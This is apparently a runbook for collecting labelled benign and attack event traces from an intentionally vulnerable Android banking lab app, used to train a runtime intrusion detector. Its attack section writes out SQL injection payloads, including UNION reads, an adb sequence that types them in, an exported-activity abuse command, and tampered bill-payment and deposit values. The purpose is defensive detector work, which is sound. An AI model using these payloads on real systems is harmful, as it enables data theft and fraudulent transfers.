# Dataset collection — benign & attack workflows

Companion to `RASP_EVENTS.md` (event schema) and `INTENTIONAL_VULNERABILITIES.md`
(per-vulnerability detail). This file is the runbook for producing the two datasets that
the IntelliRASP detector is trained/evaluated on:

- **Benign** — a legitimate user completing the six features. Labelled `result=OK`.
- **Attack** — one of the six documented weaknesses being exercised. Labelled by the
  vulnerable `component` + the `detail.op`/`detail.payload_shape` fields.

Nothing in either dataset contains a password, token, or real personal data: `RaspEvent`
scrubs `password`/`pass`/`token`/`secret` keys before writing, and every seeded profile
value uses the reserved `.invalid` TLD.

---

## 0. Prepare the environment

```bash
# 1. start the backend (its own venv has the Flask/SQLAlchemy deps)
cd AndroLabServer
./venv/bin/python -W ignore app.py --port 8888

# 2. point the app at the host loopback
adb shell am start -n com.android.insecurebankv2/.LoginActivity
#    serverip=10.0.2.2   serverport=8888
#    (set once via run-as, or type them on the Server IP / Port fields of the login screen)

# 3. log in as the seeded account  -> dinesh / Dinesh@123$
```

Sign in and go **Post Login**; the hub now shows the six feature buttons
(Account Details, Transaction History, Beneficiaries, Bill Payment, Profile, Deposit)
plus Logout.

Clear the event buffer at the start of a run so the file maps 1:1 to the session:

```bash
adb shell run-as com.android.insecurebankv2 rm -f \
  /sdcard/Android/data/com.android.insecurebankv2/files/rasp_events.jsonl
adb logcat -c
adb logcat -s InsecureRASP:I
```

---

## 1. Benign dataset (one pass)

Perform each step exactly once, in order. This is the "normal user" trace.

| # | Action (in app) | Expected event(s) | `result` |
|---|---|---|---|
| B0 | On the login screen press **Create User**, register a throwaway customer | `NAVIGATE to=SignUpActivity`, `SIGNUP_ATTEMPT`, `SIGNUP_SUCCESS` | OK |
| B1 | Launch app | `APP_START` | OK |
| B2 | Log in with `dinesh` | `LOGIN_SUCCESS` | OK |
| B3 | Open **Account Details** | `ACCOUNT_VIEW` | OK |
| B4 | Open **Transaction History**, press **Sync** | `TRANSACTION_HISTORY_VIEW`, `TRANSACTION_SYNC` | OK |
| B5 | Type a real counterparty, e.g. `Water`, press **Search** | `TRANSACTION_SEARCH_RESULT` | OK |
| B6 | Open **Beneficiaries**, add one (valid fields) | `BENEFICIARY_ADD` | OK |
| B7 | Open **Transfer**, tap **Pick Beneficiary**, choose it, submit | `BENEFICIARY_PICKER_OPEN`, `BENEFICIARY_SELECTED`, `TRANSFER` | OK |
| B8 | Open **Bill Payment**, pay `Water` / `5551234` / `20` | `BILL_PAYMENT` | OK |
| B9 | Open **Profile**, change your own email | `PROFILE_VIEW`, `PROFILE_UPDATE` | OK |
| B10 | Open **Change Password** from Profile, change it, change it back | `PASSWORD_CHANGE` ×2 | OK |
| B11 | Open **Deposit**, deposit `100` into your own account `123456789` | `DEPOSIT` | OK |
| B12 | Logout | `LOGOUT` | OK |

B0 is optional but useful: it is the only trace of a screen that runs *before* there is a
session, so it is where the model sees `component=SignUpActivity` with no `LOGIN_SUCCESS`
in front of it. A `SIGNUP_FAILURE` caused by a rejected field is **benign** — signup is
not one of the six findings, see `INTENTIONAL_VULNERABILITIES.md`. Log the B0 customer out
and delete it from `mydb.db` (`users`/`accounts`) before the next run.

Repeat B2–B12 a few times to get enough benign volume for the same sequence of
screens — the model needs the *same* component+op appearing as both benign and
attack for contrast to be learnable.

---

## 2. Attack dataset (one pass per vulnerability)

Each row below is the label for that trace. Cross-reference the matching
`RASP-VULN-00N` in `INTENTIONAL_VULNERABILITIES.md`.

| # | Vulnerable feature | Attack action | Distinguishing event signal |
|----|----|----|----|
| A1 | **Account Details** (VULN-001) | Open **Account Details** once. | `component=AccountDetailsActivity`, `result=OK` **but** the sink logged a full account dump (`detail.op=logAccountDetails`); there is no other benign op on this component that logs. |
| A2 | **Transaction History** (VULN-002) | Sync, then search with the payloads below. | `op=search` with a `detail.payload_shape` of `TAUTOLOGY`, `UNION`, or `COMMENT`. |
| A3 | **Beneficiaries** (VULN-003) | Trigger the exported component from an external shell with autofill extras (below). | `op=externalAutofill`, `result=OK`, on `BeneficiaryActivity`. |
| A4 | **Bill Payment** (VULN-004) | Pay with metacharacters / negative / non-numeric amount / empty bill number. | `BILL_PAYMENT` with `result=OK` **and** `detail.amount_valid=false` or a metacharacter in the bill number. |
| A5 | **Profile** (VULN-005) | Open **Profile** once; optionally update a field. | `PROFILE_VIEW` → sink `Log.d(BOB,"Profile: "+json)` (benign detail is identical, so the *sink* itself is the signal, not the event). |
| A6 | **Deposit** (VULN-006) | Deposit into an account number you do not own, or with a negative amount. | `DEPOSIT` with `result=OK` but `detail.owned_by_caller=false` (the server accepted it). |

### A2 — SQL injection payloads (paste into the search box)

```
'  OR  '1'='1                                        # tautology → all rows
x') UNION SELECT reference,account_number,type,
      direction,amount,counterparty,txn_date
      FROM transaction_cache --                     # UNION read (must close the paren)
'  OR  1=0 --                                       # predicate kill → empty result
' OR 1=1) UNION ALL SELECT reference,account_number,type,
      direction,amount,counterparty,txn_date
      FROM transaction_cache --                     # both arms, UNION ALL (no dedupe)
```

Headless variant (no UI taps needed) — drive the private activity from a shell that
already has a session, or use a UI-automation tool that can set text directly. Note
that `adb shell input text` **drops `'` characters**, so the tautology payload has to be
typed by a real user or by a tool that sets the field value (uiautomator2/Appium), or
assembled with `input keyevent 75` for each apostrophe:

```
adb shell input tap <search_field_x> <search_field_y>
adb shell input keyevent 123                 # move to end
for i in $(seq 1 60); do adb shell input keyevent 67; done   # clear
adb shell input keyevent 75                   # '
adb shell input text '%sOR%s'                 # " OR "
adb shell input keyevent 75                   # '
adb shell input text 1
adb shell input keyevent 75                   # '
adb shell input text '='
adb shell input keyevent 75                   # '
adb shell input text 1
adb shell input tap <search_button_x> <search_button_y>
```

The `preset_keyword` intent extra in the code only applies to an *in-app* launch
(the activity is not exported, so `am start` on it is refused by the system with a
`SecurityException`).

### A3 — exported-component abuse (no in-app tap needed)

```bash
adb shell am start -n com.android.insecurebankv2/.BeneficiaryActivity \
  --es uname dinesh \
  --es autofill_bene_name Attacker \
  --es autofill_bene_account 000111222 \
  --es autofill_bene_bank EvilCorp
```

`BeneficiaryActivity` is `exported=true`, so any installed app (or `adb shell`) can
drive it. Expect a `BENEFICIARY_ADD` with `result=success`, `source=external_intent`,
preceded by `NAVIGATE source=external_intent autofill=1`, and no in-app navigation or
login. **Do not put spaces in the values** — `adb shell` drops them and the add fails
with `reason=missing_fields` (use `MyBeneficiary` or `EvilCorp` instead).

### A4 — bill payment abuse

Valid payer `123456789`, then vary one field at a time:

```
bill_number = "'  OR  '1'='1"      amount = 500
bill_number = 5551234              amount = -9999     # accepted, but money is not moved
bill_number = ""                   amount = not-a-number
```

### A6 — deposit abuse

Valid payer your own `123456789`, then either:

```
account_number = 555555555   # belongs to jack, not dinesh — credited anyway
amount         = -4000      # reverses the direction
amount         = abc         # treated as 0, still "successful"
```

---

## 3. Collect and export

Events land in two sinks simultaneously:

- **logcat** (live, while a run is in progress):
  ```bash
  adb logcat -s InsecureRASP:I > benign.logcat.txt
  ```
- **JSONL file** on device, one JSON object per line:
  ```
  /sdcard/Android/data/com.android.insecurebankv2/files/rasp_events.jsonl
  ```
  Pull it after each labelled run:
  ```bash
  adb pull /sdcard/Android/data/com.android.insecurebankv2/files/rasp_events.jsonl ./datasets/raw/benign.jsonl
  ```

Suggested on-disk layout:

```
datasets/raw/benign_<session>.jsonl
datasets/raw/attack_vuln001_<session>.jsonl
datasets/raw/attack_vuln002_<session>.jsonl
datasets/raw/attack_vuln003_<session>.jsonl
datasets/raw/attack_vuln004_<session>.jsonl
datasets/raw/attack_vuln005_<session>.jsonl
datasets/raw/attack_vuln006_<session>.jsonl
datasets/labels.csv          # filename, label (benign|vuln001..vuln006), operator, timestamp
```

## 4. Label the trace, not the single event

- A run is labelled by **what the operator did**, then the events are attributed.
- Benign and attack traces can share components and ops (that is intentional); the
  discriminator is `detail` (ownership, amount validity, payload shape) and the *sink*
  that fired, not just the event name.
- `session` (a fresh id per login) is the grouping key for windowing a run.
- The server-side counterpart of an attack is visible in the same session: e.g. after
  an A6 cross-account deposit the balance of `555555555` changes even though the
  operator only ever saw their own screen. This "server accepted something the client
  UI should have rejected" gap is itself a training signal.

## 5. Reproducibility / reset

The backend fixture is scriptable. To reset balances, transactions, beneficiaries,
bills and the accounts any signup created back to the seeded state between runs:

```bash
python3 tools/verify_features.py     # exercises all six features + resets the fixture
```

(That script also doubles as a regression check: 102 assertions covering the benign
paths, the six vulnerabilities, the signup policy, and the original `/login`,
`/getaccounts`, `/dotransfer`, `/changepassword` routes.)
